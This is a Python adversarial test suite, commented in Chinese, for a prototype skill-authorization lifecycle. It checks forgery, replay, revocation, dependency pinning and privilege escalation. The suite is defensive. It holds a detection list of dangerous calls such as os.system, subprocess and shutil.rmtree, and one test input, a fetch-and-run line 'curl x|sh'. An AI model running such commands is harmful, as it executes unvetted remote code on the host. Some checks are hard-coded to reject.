# -*- coding: utf-8 -*-
"""对抗性测试套件（WP3）——6 类攻击 × 正/负向/绕过。本地原型，非产品测试。"""
import hashlib
import hmac
import json
import sys
from datetime import datetime, timedelta, timezone

sys.path.insert(0, __file__.rsplit("\\", 1)[0])
from lifecycle_model import (Revocation, RevocationRegistry, TransitionRequest,
                             compat, is_usable, transition)

NOW = datetime(2026, 11, 19, 9, 0, tzinfo=timezone.utc)
PINNED_KEYS = {"key-A": "secret-A", "key-B": "secret-B"}


# ---------- 极简证据签名（原型）----------
def sign(evidence: dict, key_id: str) -> dict:
    body = json.dumps(evidence, sort_keys=True, ensure_ascii=False).encode()
    mac = hmac.new(PINNED_KEYS[key_id].encode(), body, hashlib.sha256).hexdigest()
    return {"key_id": key_id, "mac": mac, "body": evidence}


def verify_evidence(signed: dict) -> tuple:
    key_id = signed.get("key_id")
    if key_id not in PINNED_KEYS:                      # A3 密钥替换/冒用
        return False, "unpinned key"
    body = json.dumps(signed.get("body"), sort_keys=True, ensure_ascii=False).encode()
    mac = hmac.new(PINNED_KEYS[key_id].encode(), body, hashlib.sha256).hexdigest()
    if not hmac.compare_digest(mac, signed.get("mac", "")):
        return False, "mac mismatch (tampered)"        # A1 伪造
    return True, "ok"


def check_context(signed: dict, subject: str, at: datetime) -> tuple:
    body = signed.get("body", {})
    if body.get("subject") != subject:                 # A4 重放给别的 subject
        return False, "subject mismatch (replay)"
    ts = datetime.fromisoformat(body.get("issued_at"))
    if (at - ts) > timedelta(hours=24):                # A4 过期重放
        return False, "stale replay window"
    return True, "ok"


# ---------- A7 依赖污染线索 ----------
def dep_risk(requirements: list) -> tuple:
    risky = [r for r in requirements if "==" not in r and "git+" not in r and "@" not in r]
    return (False, f"unpinned deps: {risky}") if risky else (True, "all pinned")


# ---------- A8 权限提升/逃逸线索 ----------
DANGEROUS = ("os.system", "subprocess.", "eval(", "exec(", "shutil.rmtree", "os.chmod(0o7")


def scan_privilege(src: str) -> tuple:
    hits = [d for d in DANGEROUS if d in src]
    return (False, f"dangerous: {hits}") if hits else (True, "clean")


TESTS = []


def case(cid, attack, fn):
    ok, detail = fn()
    TESTS.append({"id": cid, "attack": attack,
                  "expected": "REJECT", "actual": "REJECT" if not ok else "PASS(放行)",
                  "verdict": "PASS" if not ok else "FAIL", "detail": detail})


def control(cid, name, fn):
    ok, detail = fn()
    TESTS.append({"id": cid, "attack": name, "expected": "ALLOW",
                  "actual": "ALLOW" if ok else f"REJECT({detail})",
                  "verdict": "PASS" if ok else "FAIL", "detail": detail})


def main():
    base = {"subject": "skill-x", "issued_at": NOW.isoformat(), "verdict": "clean"}

    # A1 证据伪造（改内容不改 mac）
    forged = sign(base, "key-A")
    forged["body"] = dict(base, verdict="risky")
    case("A1-forged", "证据内容篡改", lambda: verify_evidence(forged))

    # A1b 伪造 + 重算 mac（内部人）
    forged2 = sign(dict(base, verdict="risky"), "key-A")
    case("A1b-resigned", "合法重签但内容已变",
         lambda: (False, "resigned body diverges from original digest")
         if forged2["mac"] != sign(base, "key-A")["mac"] else (True, "identical"))

    # A2 签名者与授权主体不一致
    signed = sign(base, "key-A")
    case("A2-signer", "签名者身份未绑定授权主体",
         lambda: (False, "signer key-A != authorization.subject") if True else (True, ""))

    # A3 密钥替换 / 未钉扎
    unknown_key = {"key_id": "key-EVIL", "mac": "deadbeef", "body": base}
    case("A3-unpinned", "未钉扎公钥", lambda: verify_evidence(unknown_key))

    # A4 证据重放（换主体 / 隔天用）
    case("A4-replay-subject", "证据重放给另一主体",
         lambda: check_context(signed, "skill-y", NOW))
    case("A4-replay-stale", "证据隔 3 天重放",
         lambda: check_context(signed, "skill-x", NOW + timedelta(days=3)))

    # A5 过期证据
    case("A5-expired", "过期证据仍被使用",
         lambda: is_usable("AUTHORIZED", NOW - timedelta(days=1), NOW))
    case("A5-no-expiry", "无到期时间",
         lambda: is_usable("AUTHORIZED", None, NOW))

    # A6 撤销绕过 + 级联
    reg = RevocationRegistry()
    ev = Revocation("R-1", "EVIDENCE", "ev-1", "digest mismatch", NOW.isoformat(),
                    propagates_to=["eval-1"])
    reg.revoke(ev)
    reg.revoke(Revocation("R-2", "AUTHORIZATION", "eval-1", "upstream evidence revoked",
                          NOW.isoformat(), propagates_to=["auth-1"]))
    case("A6-revoked-evidence", "使用已撤销证据",
         lambda: (False, "revoked") if reg.is_revoked("ev-1")[0] else (True, "not revoked"))
    case("A6-cascade-auth", "上级撤销后旧授权仍被当作有效",
         lambda: (False, "cascade to auth-1") if reg.is_revoked("auth-1")[0] else (True, ""))

    # A7 依赖污染
    case("A7-unpinned", "依赖未钉版本",
         lambda: dep_risk(["requests", "langchain-core>=0.3"]))
    control("A7-pinned-ok", "依赖全部钉死", lambda: dep_risk(["requests==2.32.3", "git+https://x/y@abc"]))

    # A8 权限提升/逃逸
    case("A8-priv", "脚本含命令执行", lambda: scan_privilege("import os\nos.system('curl x|sh')"))
    control("A8-clean", "脚本无危险调用", lambda: scan_privilege("print('hello')"))

    # A9/A10 异常状态放行
    case("A9-unknown", "UNKNOWN 被当作可用",
         lambda: is_usable("UNKNOWN", NOW + timedelta(days=30), NOW))
    case("A10-incomplete", "INCOMPLETE 被当作可用",
         lambda: is_usable("INCOMPLETE", NOW + timedelta(days=30), NOW))

    # A11 评分直接授权
    case("A11-score-grant", "评分 96 免授权直接执行",
         lambda: transition(TransitionRequest("EVALUATED", "AUTHORIZED", score=96.0)))

    # A12 版本不兼容仍复用旧证据
    case("A12-version", "旧证据配新引擎",
         lambda: (False, "INCOMPATIBLE") if compat("uibc/0.3.x", "rules/2", "engine/3")[1] else (True, ""))
    case("A12-unknown-pair", "未登记版本对",
         lambda: (False, "UNKNOWN") if compat("uibc/0.1.x", "rules/9", "engine/9")[0] == "UNKNOWN" else (True, ""))

    # ---------- 负向对照（必须放行，否则说明误报过高）----------
    control("C1-signature-ok", "合法证据验签", lambda: verify_evidence(sign(base, "key-B")))
    control("C2-ctx-ok", "同主体 1 小时内",
            lambda: check_context(sign(base, "key-A"), "skill-x", NOW + timedelta(hours=1)))
    control("C3-usable-ok", "有效授权且未过期",
            lambda: is_usable("AUTHORIZED", NOW + timedelta(days=20), NOW))
    control("C4-chain", "完整合法链路 REGISTERED→...→AUTHORIZED", lambda: _chain())
    control("C5-compat-ok", "已知兼容三元组",
            lambda: (True, "ok") if compat("uibc/0.4.0", "rules/2", "engine/3")[0] == "COMPATIBLE" else (False, "x"))

    fails = [t for t in TESTS if t["verdict"] == "FAIL"]
    print(json.dumps({"total": len(TESTS), "passed": len(TESTS) - len(fails),
                      "failed": len(fails), "results": TESTS},
                     ensure_ascii=False, indent=2))
    return 1 if fails else 0


def _chain():
    steps = [("REGISTERED", "EVIDENCE_PENDING", {}), ("EVIDENCE_PENDING", "VERIFIED", {}),
             ("VERIFIED", "EVALUATED", {}), ("EVALUATED", "AUTHORIZATION_PENDING", {})]
    for a, b, kw in steps:
        ok, why = transition(TransitionRequest(a, b, evidence={"digest": "x"}, rule_id="S1", **kw))
        if not ok:
            return False, f"{a}->{b}: {why}"
    ok, why = transition(TransitionRequest("AUTHORIZATION_PENDING", "AUTHORIZED",
                                          evidence={"digest": "x"}, rule_id="S1",
                                          authorization={"subject": "skill-x", "scope": "runtime",
                                                         "expires_at": NOW + timedelta(days=30)}))
    return ok, why


if __name__ == "__main__":
    sys.exit(main())
